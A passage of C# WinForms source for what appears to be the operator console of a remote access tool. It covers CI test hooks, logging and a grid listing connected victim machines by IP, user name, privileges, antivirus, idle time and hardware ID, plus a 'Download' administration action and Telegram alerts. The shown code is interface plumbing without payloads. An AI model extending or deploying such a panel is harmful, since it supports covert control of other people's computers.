                        {
                            label.Text = path;
                            return;
                        }
                    }
                }
            }
        }

        private string FormatMyAss(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }


        private void InitializeLogging()
        {
            // Setup the rich text box
            richTextBox1.BackColor = Color.Black;
            richTextBox1.ForeColor = Color.White;
            richTextBox1.Font = new Font("Consolas", 9F, FontStyle.Regular);
            richTextBox1.ReadOnly = true;

            // Setup timer for batch processing logs (more efficient than updating on every log)
            logUpdateTimer = new System.Windows.Forms.Timer();
            logUpdateTimer.Interval = 500; // Update every half second
            logUpdateTimer.Tick += ProcessLogQueue;
            logUpdateTimer.Start();

            // Write initial message
            LogToMonitor("Traffic monitoring initialized", LogType.System);
            LogToMonitor("Server ready. Click 'Start Listening' to begin.", LogType.Info);
        }


        public void LogToMonitor(string message, LogType type)
        {
            // Add to queue instead of directly updating UI
            logQueue.Enqueue(new LogEntry
            {
                Timestamp = DateTime.Now,
                Message = message,
                Type = type
            });

            // Don't let the queue grow too large
            if (logQueue.Count > maxLogEntries * 2)
            {
                // Emergency cleanup if queue gets too big
                LogEntry dummy;
                while (logQueue.Count > maxLogEntries && logQueue.TryDequeue(out dummy))
                {
                    // Just removing excess entries
                }
            }
        }


        private void ProcessLogQueue(object sender, EventArgs e)
        {
            if (logQueue.IsEmpty)
                return;

            // Check if we need to trim the text in the rich text box
            if (richTextBox1.Lines.Length > maxLogEntries)
            {
                richTextBox1.SuspendLayout();
                int cutoff = richTextBox1.GetFirstCharIndexFromLine(richTextBox1.Lines.Length - maxLogEntries);
                richTextBox1.Select(0, cutoff);
                richTextBox1.SelectedText = "";
                richTextBox1.ResumeLayout();
            }

            // Process up to 100 logs at a time to prevent UI freeze
            int processCount = Math.Min(100, logQueue.Count);
            if (processCount == 0)
                return;

            // Build a batch of log entries for efficiency
            richTextBox1.SuspendLayout();
            bool wasAtBottom = IsRichTextBoxScrolledToBottom();

            StringBuilder batch = new StringBuilder();
            for (int i = 0; i < processCount; i++)
            {
                if (logQueue.TryDequeue(out LogEntry entry))
                {
                    // Format: [Time] Message
                    string timestamp = entry.Timestamp.ToString("HH:mm:ss.fff");
                    string formatted = $"[{timestamp}] {entry.Message}\n";

                    // Append to rich text box with color
                    int startIndex = richTextBox1.TextLength;
                    richTextBox1.AppendText(formatted);
                    richTextBox1.Select(startIndex, formatted.Length);
                    richTextBox1.SelectionColor = entry.GetColor();
                    richTextBox1.SelectionLength = 0; // Deselect
                }
            }

            // Auto-scroll if was at bottom before
            if (wasAtBottom && autoScroll)
            {
                richTextBox1.SelectionStart = richTextBox1.Text.Length;
                richTextBox1.ScrollToCaret();
            }

            richTextBox1.ResumeLayout();
        }

        private bool IsRichTextBoxScrolledToBottom()
        {
            // No need for complex calculations, just use a simple approximation
            return richTextBox1.SelectionStart >= richTextBox1.Text.Length - 10;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Register cleanup handler.
            this.FormClosing += (s, args) => CleanupResourceMonitor();

            // Keep the window inside the monitor working area so it never extends
            // underneath the Windows taskbar on shorter displays.
            FitFormToWorkingArea();

            if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
            {
                BeginInvoke(new Action(() =>
                {
                    try
                    {
                        xtraTabControl1.SelectedTabPage = xtraTabPage1;
                        textEdit1.Text = "4793";
                        if (!isServerRunning)
                            StartServer(4793);
                        label45.Text = "4793";
                    }
                    catch (Exception ex)
                    {
                        LogToMonitor("CI smoke startup failed: " + ex.Message, LogType.Error);
                    }
                }));
            }

            if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
            {
                BeginInvoke(new Action(WriteCiUiValidation));
                SetupCiSmokeAutomation();
                SetupCiNotificationsAutomation();
            }
        }

        private void SetupCiSmokeAutomation()
        {
            // CI-only automation hook. A WinForms Timer is intentionally not used here:
            // the workflow must be able to trigger this while the application may later
            // enter a nested modal message loop, and the previous timer implementation
            // provided no independent evidence that its UI-thread Tick was ever running.
            // A tiny background poller observes the filesystem trigger and marshals the
            // real dialog invocation onto the form's UI thread with BeginInvoke.
            if (ciSmokeAutomationThread != null && ciSmokeAutomationThread.IsAlive)
                return;

            ciSmokeAutomationStopRequested = false;
            ciSmokeAutomationThread = new Thread((ThreadStart)delegate
            {
                string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string triggerPath = Path.Combine(baseDirectory, "ci-open-download-one.flag");
                string readyPath = Path.Combine(baseDirectory, "ci-administration-automation-ready.flag");
                string errorPath = Path.Combine(baseDirectory, "ci-administration-automation-error.txt");
                string consumedPath = Path.Combine(baseDirectory, "ci-open-download-one-consumed.flag");

                try
                {
                    File.WriteAllText(
                        readyPath,
                        "READY|" + DateTime.UtcNow.ToString("O") + "|BaseDirectory=" + baseDirectory);
                }
                catch (Exception ex)
                {
                    try
                    {
                        File.WriteAllText(errorPath,
                            "READY_WRITE_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                    }
                    catch
                    {
                        // CI diagnostics must never terminate the application.
                    }
                }

                while (!ciSmokeAutomationStopRequested)
                {
                    if (!File.Exists(triggerPath))
                    {
                        Thread.Sleep(100);
                        continue;
                    }

                    try
                    {
                        File.Delete(triggerPath);
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            File.WriteAllText(errorPath,
                                "TRIGGER_DELETE_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                        }
                        catch { }
                        Thread.Sleep(100);
                        continue;
                    }

                    try
                    {
                        File.WriteAllText(
                            consumedPath,
                            "CONSUMED|" + DateTime.UtcNow.ToString("O") + "|BaseDirectory=" + baseDirectory);
                    }
                    catch
                    {
                        // The dialog invocation below remains the actual signal.
                    }

                    try
                    {
                        if (IsDisposed || Disposing)
                            return;

                        BeginInvoke(new Action(delegate
                        {
                            try
                            {
                                ShowAdministrationDialog("Download [ One ]");
                            }
                            catch (Exception ex)
                            {
                                LogToMonitor("CI administration dialog automation failed: " + ex.Message, LogType.Error);
                                try
                                {
                                    File.WriteAllText(errorPath,
                                        "SHOW_DIALOG_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                                }
                                catch { }
                            }
                        }));
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            File.WriteAllText(errorPath,
                                "BEGININVOKE_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                        }
                        catch { }
                        return;
                    }

                    return;
                }
            })
            {
                IsBackground = true,
                Name = "ZTSEC-CI-Administration-Automation"
            };
            ciSmokeAutomationThread.Start();
        }


        private void SetupCiNotificationsAutomation()
        {
            // CI-only page-navigation hook. Match the Administration automation pattern:
            // a background filesystem poller observes the trigger, consumes it, and
            // marshals navigation onto the real WinForms UI thread. The marker is written
            // only after the selected tab and required controls have been verified visible.
            if (ciNotificationsAutomationThread != null && ciNotificationsAutomationThread.IsAlive)
                return;

            ciNotificationsAutomationStopRequested = false;
            ciNotificationsAutomationThread = new Thread((ThreadStart)delegate
            {
                string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string triggerPath = Path.Combine(baseDirectory, "ci-open-notifications.flag");
                string consumedPath = Path.Combine(baseDirectory, "ci-open-notifications-consumed.flag");
                string errorPath = Path.Combine(baseDirectory, "ci-notifications-page-error.txt");

                while (!ciNotificationsAutomationStopRequested)
                {
                    if (!File.Exists(triggerPath))
                    {
                        Thread.Sleep(100);
                        continue;
                    }

                    try
                    {
                        File.Delete(triggerPath);
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            File.WriteAllText(errorPath,
                                "TRIGGER_DELETE_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                        }
                        catch { }
                        Thread.Sleep(100);
                        continue;
                    }

                    try
                    {
                        File.WriteAllText(
                            consumedPath,
                            "CONSUMED|" + DateTime.UtcNow.ToString("O") + "|BaseDirectory=" + baseDirectory);
                    }
                    catch
                    {
                        // Page navigation below remains the actual UI signal.
                    }

                    try
                    {
                        if (IsDisposed || Disposing)
                            return;

                        BeginInvoke(new Action(delegate
                        {
                            try
                            {
                                NavigateToNotificationsForCi();
                            }
                            catch (Exception ex)
                            {
                                LogToMonitor("CI notifications page automation failed: " + ex.Message, LogType.Error);
                                try
                                {
                                    File.WriteAllText(errorPath,
                                        "NAVIGATE_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                                }
                                catch { }
                            }
                        }));
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            File.WriteAllText(errorPath,
                                "BEGININVOKE_FAILED|" + DateTime.UtcNow.ToString("O") + "|" + ex);
                        }
                        catch { }
                        return;
                    }

                    return;
                }
            })
            {
                IsBackground = true,
                Name = "ZTSEC-CI-Notifications-Automation"
            };
            ciNotificationsAutomationThread.Start();
        }

        private void WriteCiUiValidation()
        {
            if (!string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
                return;

            string validationPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ci-ui-validation.txt");
            try
            {
                connectionsLayoutHost.PerformLayout();
                connectionsSearchBar.PerformLayout();
                gridControl1.PerformLayout();

                bool hierarchyValid =
                    ReferenceEquals(connectionsLayoutHost.Parent, xtraTabPage1) &&
                    ReferenceEquals(connectionsSearchBar.Parent, connectionsLayoutHost) &&
                    ReferenceEquals(gridControl1.Parent, connectionsLayoutHost);

                bool regionsDoNotOverlap =
                    !connectionsSearchBar.Bounds.IntersectsWith(gridControl1.Bounds) &&
                    gridControl1.Top >= connectionsSearchBar.Bottom;

                ShowConnectionsSearch();
                connectionsSearchBar.PerformLayout();
                bool expandedWidthValid = connectionsSearchEditorHost.Visible &&
                    connectionsSearchEditorHost.Width > 0 &&
                    connectionsSearchEditorHost.Width <= 520 &&
                    connectionsSearchEditorHost.Width <= connectionsSearchBar.ClientSize.Width;
                HideConnectionsSearch();
                bool collapsedStateValid = connectionsSearchButton.Visible && !connectionsSearchEditorHost.Visible;

                string[] requiredColumns = { "IP", "UserName", "GPU", "Ping" };
                bool requiredColumnsVisible = requiredColumns.All(name => gridView.Columns[name] != null && gridView.Columns[name].Visible);
                bool connectionRowsValid = clientsTable.Rows.Count >= 2 &&
                    requiredColumns.All(name => { var value = Convert.ToString(clientsTable.Rows[0][name]); return !string.IsNullOrWhiteSpace(value); });

                bool selectedAccentProbeReady = false;
                if (connectionRowsValid && gridView.DataRowCount > 0)
                {
                    // CI deliberately selects a real row so the rendered screenshot
                    // contains the same selected-row accent that a user sees. This is
                    // verification-only behavior and is not enabled in production.
                    gridView.ClearSelection();
                    gridView.FocusedRowHandle = 0;
                    gridView.SelectRow(0);
                    gridView.RefreshRow(0);
                    gridControl1.Refresh();
                    selectedAccentProbeReady = gridView.IsRowSelected(0);
                }

                int currentDpi = GetCurrentDpi();
                int expectedSidebarDeviceWidth = ScaleLogicalPixels(SidebarWidth, currentDpi);
                bool sidebarWidthValid = accordionControl1.Width == expectedSidebarDeviceWidth;
                bool notificationsPageStructureValid =
                    notificationsTabPage != null &&
                    notificationsPageRoot != null &&
                    notificationsWindowsToggle != null &&
                    notificationsTelegramTokenTextBox != null &&
                    notificationsTelegramChatIdTextBox != null &&
                    notificationsTelegramToggle != null &&
                    notificationsTelegramTestButton != null &&
                    notificationsTabPage.Controls.Contains(notificationsPageRoot);

                using (StreamWriter writer = new StreamWriter(validationPath, false))
                {
                    writer.WriteLine("STATUS: " + (hierarchyValid && regionsDoNotOverlap && expandedWidthValid && collapsedStateValid && requiredColumnsVisible && connectionRowsValid && sidebarWidthValid && notificationsPageStructureValid && SidebarAccentColor.ToArgb() == UiTheme.AccentColor.ToArgb() && selectedAccentProbeReady ? "PASS" : "FAIL"));
                    writer.WriteLine("Hierarchy: " + (hierarchyValid ? "valid" : "invalid"));
                    writer.WriteLine("SearchBarBounds: " + connectionsSearchBar.Bounds);
                    writer.WriteLine("GridBounds: " + gridControl1.Bounds);
                    writer.WriteLine("SearchWidth: " + connectionsSearchEditorHost.Width);
                    writer.WriteLine("SearchQuarterRatio: " + (connectionsSearchBar.ClientSize.Width == 0 ? 0D : (double)connectionsSearchEditorHost.Width / connectionsSearchBar.ClientSize.Width).ToString("0.000"));
                    writer.WriteLine("DisjointSearchAndGridRegions: " + (regionsDoNotOverlap ? "yes" : "no"));
                    writer.WriteLine("CollapsedSearchState: " + (collapsedStateValid ? "valid" : "invalid"));
                    writer.WriteLine("Dpi: " + currentDpi);
                    writer.WriteLine("SidebarWidthDevicePixels: " + accordionControl1.Width);
                    writer.WriteLine("SidebarTargetLogical96Dpi: " + SidebarWidth);
                    writer.WriteLine("SidebarExpectedDevicePixels: " + expectedSidebarDeviceWidth);
                    writer.WriteLine("SidebarWidthMatchesDpiScaledTarget: " + (sidebarWidthValid ? "yes" : "no"));
                    writer.WriteLine("AccentColorRgb: " + SidebarAccentColor.R + "," + SidebarAccentColor.G + "," + SidebarAccentColor.B);
                    writer.WriteLine("AccentColorHex: #" + SidebarAccentColor.R.ToString("X2") + SidebarAccentColor.G.ToString("X2") + SidebarAccentColor.B.ToString("X2"));
                    writer.WriteLine("AccentColorMatchesSharedToken: " + (SidebarAccentColor.ToArgb() == UiTheme.AccentColor.ToArgb() ? "yes" : "no"));
                    writer.WriteLine("SelectedAccentProbeReady: " + (selectedAccentProbeReady ? "yes" : "no"));
                    writer.WriteLine("NotificationsPage: " + (notificationsPageStructureValid ? "valid" : "invalid"));
                    writer.WriteLine("ConnectionRows: " + clientsTable.Rows.Count);
                    writer.WriteLine("IP=" + (gridView.Columns["IP"].Visible ? "visible" : "hidden"));
                    writer.WriteLine("UserName=" + (gridView.Columns["UserName"].Visible ? "visible" : "hidden"));
                    writer.WriteLine("GPU=" + (gridView.Columns["GPU"].Visible ? "visible" : "hidden"));
                    writer.WriteLine("Ping=" + (gridView.Columns["Ping"].Visible ? "visible" : "hidden"));
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(validationPath, "STATUS: FAIL\r\nException: " + ex);
            }
        }

        private void FitFormToWorkingArea()
        {
            if (WindowState == FormWindowState.Maximized)
                return;

            Screen screen = Screen.FromControl(this);
            Rectangle workingArea = screen.WorkingArea;

            int width = Math.Min(Width, workingArea.Width);
            int height = Math.Min(Height, workingArea.Height);

            if (width == Width && height == Height &&
                Bounds.Left >= workingArea.Left &&
                Bounds.Top >= workingArea.Top &&
                Bounds.Right <= workingArea.Right &&
                Bounds.Bottom <= workingArea.Bottom)
            {
                return;
            }

            Size = new Size(width, height);
            Left = Math.Max(workingArea.Left, Math.Min(Left, workingArea.Right - width));
            Top = Math.Max(workingArea.Top, Math.Min(Top, workingArea.Bottom - height));
        }

        private void SetupGridControl()
        {
            clientsTable = new DataTable("Clients");
            clientsTable.Columns.Add("IP", typeof(string));
            clientsTable.Columns.Add("Country", typeof(string));
            clientsTable.Columns.Add("Nickname", typeof(string));
            clientsTable.Columns.Add("Tag", typeof(string));
            clientsTable.Columns.Add("UserName", typeof(string));
            clientsTable.Columns.Add("Version", typeof(string));
            clientsTable.Columns.Add("Privileges", typeof(string));
            clientsTable.Columns.Add("OS", typeof(string));
            clientsTable.Columns.Add("GPU", typeof(string));
            clientsTable.Columns.Add("CPU", typeof(string));
            clientsTable.Columns.Add("RAM", typeof(string));
            clientsTable.Columns.Add("AntiVirus", typeof(string));
            clientsTable.Columns.Add("Uptime", typeof(string));
            clientsTable.Columns.Add("AFKTime", typeof(string));
            clientsTable.Columns.Add("Ping", typeof(string));
            clientsTable.Columns.Add("HWID", typeof(string));
            clientsTable.Columns.Add("ConnectionId", typeof(string));

            gridControl1.DataSource = clientsTable;
            gridView = gridControl1.MainView as GridView;

            if (gridView == null)
                return;

            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsSelection.EnableAppearanceFocusedCell = false;
            gridView.OptionsSelection.EnableAppearanceFocusedRow = true;
            gridView.OptionsSelection.MultiSelect = true;
            gridView.OptionsSelection.MultiSelectMode = DevExpress.XtraGrid.Views.Grid.GridMultiSelectMode.RowSelect;
            gridView.FocusRectStyle = DevExpress.XtraGrid.Views.Grid.DrawFocusRectStyle.RowFocus;
            gridView.OptionsView.ColumnAutoWidth = false;
            gridView.OptionsView.ShowGroupPanel = false;

            // Keep horizontal scrolling available at all times. DevExpress documents
            // ColumnAutoWidth=false + HorzScrollVisibility=Always for this behavior.
            // The application globally uses ScrollUIMode.Desktop, so the stock DevExpress
            // scrollbar remains visible without a custom paint hook.
            // Both axes are forced to Always so the scroll thumb is permanently painted,
            // not just on mouse-over. This also ensures the bottom scrollbar stays visible
            // regardless of which DevExpress skin is active.
            gridView.HorzScrollVisibility = DevExpress.XtraGrid.Views.Base.ScrollVisibility.Always;
            gridView.VertScrollVisibility = DevExpress.XtraGrid.Views.Base.ScrollVisibility.Auto;
            gridControl1.UseEmbeddedNavigator = false;

            // Search is hosted in the dedicated toolbar field below instead of the
            // grid's embedded Find Panel. This keeps the column-header row in the
            // grid layout and prevents the search surface from covering the first
            // columns. The standalone SearchControl uses the documented GridControl
            // search client API.
            gridView.OptionsFind.AllowFindPanel = false;
            gridView.OptionsFind.FindFilterColumns = "*";
            gridView.OptionsFind.Condition = DevExpress.Data.Filtering.FilterCondition.Contains;
            gridView.OptionsFind.Behavior = DevExpress.XtraEditors.FindPanelBehavior.Filter;
            gridView.OptionsFind.FindMode = DevExpress.XtraEditors.FindMode.Always;

            gridView.Columns["IP"].Caption = "IP Address";
            gridView.Columns["Country"].Caption = "Country";
            gridView.Columns["Nickname"].Caption = "Nickname";
            gridView.Columns["Tag"].Caption = "Tag";
            gridView.Columns["UserName"].Caption = "User Name";
            gridView.Columns["Version"].Caption = "Version";
            gridView.Columns["Privileges"].Caption = "Privileges";
            gridView.Columns["OS"].Caption = "OS";
            gridView.Columns["GPU"].Caption = "GPU";
            gridView.Columns["CPU"].Caption = "CPU";
            gridView.Columns["RAM"].Caption = "RAM";
            gridView.Columns["AntiVirus"].Caption = "Anti Virus";
            gridView.Columns["Uptime"].Caption = "Uptime";
            gridView.Columns["AFKTime"].Caption = "AFK Time";
            gridView.Columns["Ping"].Caption = "Ping";
            gridView.Columns["HWID"].Caption = "HWID";

            gridView.Columns["IP"].Width = 120;
            gridView.Columns["Country"].Width = 100;
            gridView.Columns["Nickname"].Width = 140;
            gridView.Columns["Tag"].Width = 110;
            gridView.Columns["UserName"].Width = 130;
            gridView.Columns["Version"].Width = 125;
            gridView.Columns["Privileges"].Width = 110;
            gridView.Columns["OS"].Width = 150;
            gridView.Columns["GPU"].Width = 180;
            gridView.Columns["CPU"].Width = 170;
            gridView.Columns["RAM"].Width = 130;
            gridView.Columns["AntiVirus"].Width = 160;
            gridView.Columns["Uptime"].Width = 110;
            gridView.Columns["AFKTime"].Width = 110;
            gridView.Columns["Ping"].Width = 85;
            gridView.Columns["HWID"].Width = 260;
            gridView.Columns["ConnectionId"].Visible = false;

            // Keep the connection identity and health fields in the initial viewport.
            // Remaining columns stay available through the grid's horizontal scroll bar.
            // Keep the requested connection-information order. CPU is retained as a
            // useful hardware field and placed immediately after GPU.
            string[] priorityColumns = {
                "IP", "Country", "UserName", "Tag", "Nickname", "Version",
                "Privileges", "OS", "GPU", "CPU", "RAM", "AntiVirus",
                "Uptime", "AFKTime", "Ping", "HWID"
            };
            for (int index = 0; index < priorityColumns.Length; index++)
                gridView.Columns[priorityColumns[index]].VisibleIndex = index;

            gridView.RowStyle += (sender, args) =>
            {
                if (args.RowHandle >= 0 && gridView.IsRowSelected(args.RowHandle))
                {
                    // Do not use the DevExpress/default blue here.  This was the
                    // Use the exact requested dark selection surface for Connections rows.
                    args.Appearance.BackColor = ColorTranslator.FromHtml("#1A2028");
                    args.Appearance.ForeColor = Color.White;
                    args.HighPriority = true;
                }
            };

            gridView.FocusedRowChanged += GridView_FocusedRowChanged;
            gridView.MouseDown += GridView_MouseDown;
            gridView.RowClick += GridView_RowClick;
            gridView.SelectionChanged += delegate { HandleGridSelectionChanged(); };

            SetupConnectionsSearchButton();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (!e.Control || e.KeyCode != Keys.F || xtraTabControl1 == null || xtraTabControl1.SelectedTabPage != xtraTabPage1)
                return;

            ShowConnectionsSearch();
            e.Handled = true;
            e.SuppressKeyPress = true;
        }

        private void ConfigureConnectionsLayout()
        {
            // The Connections tab previously used the grid as its only designed child,
            // then injected the search bar as a sibling at runtime. That mixed a large
            // anchored designer surface with runtime docking/z-order and made the two
            // regions compete for the same bounds. Give the tab one explicit content
            // host so the header and grid own disjoint layout regions.
            if (connectionsLayoutHost != null)
                return;

            xtraTabPage1.Controls.Remove(gridControl1);

            connectionsLayoutHost = new DevExpress.XtraEditors.PanelControl();
            connectionsLayoutHost.Name = "connectionsLayoutHost";
            connectionsLayoutHost.Dock = DockStyle.Fill;
            connectionsLayoutHost.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;

            connectionsSearchBar = new DevExpress.XtraEditors.PanelControl();
            connectionsSearchBar.Name = "connectionsSearchBar";
            connectionsSearchBar.Dock = DockStyle.Top;
            connectionsSearchBar.Height = 42;
            connectionsSearchBar.Padding = new Padding(4);
            connectionsSearchBar.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;

            gridControl1.Dock = DockStyle.Fill;
            gridControl1.Margin = Padding.Empty;
            gridControl1.Location = Point.Empty;

            connectionsLayoutHost.Controls.Add(gridControl1);
            connectionsLayoutHost.Controls.Add(connectionsSearchBar);
            xtraTabPage1.Controls.Add(connectionsLayoutHost);
            connectionsLayoutHost.BringToFront();
        }

        private int GetConnectionsExpandedSearchWidth()
        {
            if (connectionsSearchBar == null)
                return 0;

            // Keep the expanded surface responsive: approximately one quarter of the
            // currently available header width, with practical usability bounds.
            int quarter = (int)Math.Round(connectionsSearchBar.ClientSize.Width * 0.25D);
            return Math.Max(220, Math.Min(520, quarter));
        }

        private void UpdateConnectionsSearchLayout()
        {
            if (connectionsSearchBar == null || connectionsSearchEditorHost == null)
                return;

            connectionsSearchEditorHost.Width = GetConnectionsExpandedSearchWidth();
        }

        private void SetupConnectionsSearchButton()
        {
            if (connectionsSearchButton != null)
                return;

            connectionsSearchButton = new DevExpress.XtraEditors.SimpleButton();
            connectionsSearchButton.Name = "connectionsSearchButton";
            connectionsSearchButton.Dock = DockStyle.Right;
            connectionsSearchButton.Width = 42;
            connectionsSearchButton.Text = string.Empty;
            connectionsSearchButton.Cursor = Cursors.Hand;
            connectionsSearchButton.ToolTip = "Search connections (Ctrl+F)";
            connectionsSearchButton.ImageOptions.Image = CreateSearchIcon();
            connectionsSearchButton.Appearance.BackColor = SidebarBackgroundColor;
            connectionsSearchButton.Appearance.ForeColor = Color.White;
            connectionsSearchButton.Appearance.Options.UseBackColor = true;
            connectionsSearchButton.Appearance.Options.UseForeColor = true;
            connectionsSearchButton.AllowFocus = false;
            connectionsSearchButton.ShowFocusRectangle = DevExpress.Utils.DefaultBoolean.False;
            connectionsSearchButton.TabStop = false;
            connectionsSearchButton.MouseEnter += delegate {
                connectionsSearchButton.Appearance.BackColor = SidebarAccentColor;
                connectionsSearchButton.Appearance.ForeColor = Color.White;
            };
            connectionsSearchButton.MouseLeave += delegate {
                connectionsSearchButton.Appearance.BackColor = SidebarBackgroundColor;
                connectionsSearchButton.Appearance.ForeColor = Color.White;
            };
            connectionsSearchButton.Click += delegate { ShowConnectionsSearch(); };

            connectionsSearchEditorHost = new DevExpress.XtraEditors.PanelControl();
            connectionsSearchEditorHost.Name = "connectionsSearchEditorHost";
            connectionsSearchEditorHost.Dock = DockStyle.Right;
            connectionsSearchEditorHost.Height = connectionsSearchBar.ClientSize.Height - connectionsSearchBar.Padding.Vertical;
            connectionsSearchEditorHost.Padding = new Padding(0);
            connectionsSearchEditorHost.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;
            connectionsSearchEditorHost.Visible = false;

            connectionsSearchControl = new DevExpress.XtraEditors.SearchControl();
            connectionsSearchControl.Name = "connectionsSearchControl";
            connectionsSearchControl.Dock = DockStyle.Fill;
            connectionsSearchControl.Client = gridControl1;
            connectionsSearchControl.Properties.FindDelay = 150;
            connectionsSearchControl.Properties.NullValuePrompt = "Search connections...";
            connectionsSearchControl.ToolTip = "Search connections";
            connectionsSearchControl.KeyDown += ConnectionsSearchControl_KeyDown;

            connectionsSearchCloseButton = new DevExpress.XtraEditors.SimpleButton();
            connectionsSearchCloseButton.Name = "connectionsSearchCloseButton";
            connectionsSearchCloseButton.Dock = DockStyle.Right;
            connectionsSearchCloseButton.Width = 34;
            connectionsSearchCloseButton.Text = "×";
            connectionsSearchCloseButton.Cursor = Cursors.Hand;
            connectionsSearchCloseButton.ToolTip = "Close search (Esc)";
            connectionsSearchCloseButton.ForeColor = Color.White;
            connectionsSearchCloseButton.Appearance.BackColor = SidebarBackgroundColor;
            connectionsSearchCloseButton.Appearance.ForeColor = Color.White;
            connectionsSearchCloseButton.Appearance.Options.UseBackColor = true;
            connectionsSearchCloseButton.Appearance.Options.UseForeColor = true;
            connectionsSearchCloseButton.AllowFocus = false;
            connectionsSearchCloseButton.ShowFocusRectangle = DevExpress.Utils.DefaultBoolean.False;
            connectionsSearchCloseButton.TabStop = false;
            connectionsSearchCloseButton.MouseEnter += delegate {
                connectionsSearchCloseButton.Appearance.BackColor = SidebarAccentColor;
                connectionsSearchCloseButton.Appearance.ForeColor = Color.White;
                connectionsSearchCloseButton.ForeColor = Color.White;
            };
            connectionsSearchCloseButton.MouseLeave += delegate {
                connectionsSearchCloseButton.Appearance.BackColor = SidebarBackgroundColor;
                connectionsSearchCloseButton.Appearance.ForeColor = Color.White;
                connectionsSearchCloseButton.ForeColor = Color.White;
            };
            connectionsSearchCloseButton.Click += delegate { HideConnectionsSearch(); };

            connectionsSearchEditorHost.Controls.Add(connectionsSearchControl);
            connectionsSearchEditorHost.Controls.Add(connectionsSearchCloseButton);
            connectionsSearchBar.Controls.Add(connectionsSearchButton);
            connectionsSearchBar.Controls.Add(connectionsSearchEditorHost);
            connectionsSearchBar.Resize += delegate { UpdateConnectionsSearchLayout(); };

            UpdateConnectionsSearchLayout();
        }

        private void ShowConnectionsSearch()
        {
            if (connectionsSearchControl == null || connectionsSearchButton == null || connectionsSearchCloseButton == null)
                return;

            connectionsSearchButton.Visible = false;
            connectionsSearchEditorHost.Visible = true;
            UpdateConnectionsSearchLayout();
            connectionsSearchEditorHost.BringToFront();
            connectionsSearchControl.Focus();
            connectionsSearchControl.SelectAll();
        }

        private void HideConnectionsSearch()
        {
            if (connectionsSearchControl == null || connectionsSearchButton == null || connectionsSearchCloseButton == null)
                return;

            connectionsSearchControl.Visible = true;
            connectionsSearchEditorHost.Visible = false;
            connectionsSearchButton.Visible = true;
            connectionsSearchButton.BringToFront();
            if (xtraTabControl1 != null) xtraTabControl1.Focus();
        }

        private void ConnectionsSearchControl_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Escape)
                return;

            if (!string.IsNullOrEmpty(connectionsSearchControl.Text))
            {
                connectionsSearchControl.Text = string.Empty;
                e.Handled = true;
                e.SuppressKeyPress = true;
                return;
            }

            HideConnectionsSearch();
            e.Handled = true;
            e.SuppressKeyPress = true;
        }

        private Bitmap CreateSearchIcon()
        {
            Bitmap bitmap = new Bitmap(18, 18);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            using (Pen pen = new Pen(Color.White, 2.0f))
            {
                graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
                graphics.Clear(Color.Transparent);
                graphics.DrawEllipse(pen, 2, 2, 9, 9);
                graphics.DrawLine(pen, 10, 10, 15, 15);
            }
            return bitmap;
        }

        private void GridView_MouseDown(object sender, MouseEventArgs e)
        {
            connectionMouseDownSelectionId = string.Empty;
            connectionMouseDownWasSelected = false;

            if (e.Button != MouseButtons.Left || gridView == null)
                return;

            GridHitInfo hitInfo = gridView.CalcHitInfo(e.Location);

            if (hitInfo.InDataRow && hitInfo.RowHandle >= 0)
            {
                connectionMouseDownSelectionId = Convert.ToString(
                    gridView.GetRowCellValue(hitInfo.RowHandle, "ConnectionId"));
                connectionMouseDownWasSelected = gridView.IsRowSelected(hitInfo.RowHandle);
                return;
            }

            // Only clicks in the actual empty-row area clear selection. Do not
            // treat headers, the group panel, scrollbars, the filter panel, or
            // other grid UI as an empty-space click.
            if (hitInfo.HitTest == GridHitTest.EmptyRow)
            {
                gridView.ClearSelection();
                HighlightClientOnMap(string.Empty);
            }
        }

        private void GridView_RowClick(object sender, DevExpress.XtraGrid.Views.Grid.RowClickEventArgs e)
        {
            if (e.RowHandle < 0 || e.Button != MouseButtons.Left)
                return;

            // RowClick may run before or after DevExpress applies its native row
            // selection. The pre-click state is therefore captured on MouseDown;
            // never infer it from IsRowSelected here. If the clicked row was
            // already selected, wait until native processing completes and then
            // toggle that same ConnectionId off. Resolving the current selected
            // row by ConnectionId avoids stale row-handle races during filtering
            // or other view updates.
            if (!connectionMouseDownWasSelected || string.IsNullOrWhiteSpace(connectionMouseDownSelectionId))
                return;

            string connectionId = connectionMouseDownSelectionId;
            BeginInvoke(new Action(() => UnselectConnectionById(connectionId)));
        }

        private void UnselectConnectionById(string connectionId)
        {
            if (IsDisposed || !IsHandleCreated || gridView == null || string.IsNullOrWhiteSpace(connectionId))
                return;

            int[] selectedRows = gridView.GetSelectedRows();
            if (selectedRows == null)
                return;

            foreach (int rowHandle in selectedRows)
            {
                if (rowHandle < 0)
                    continue;

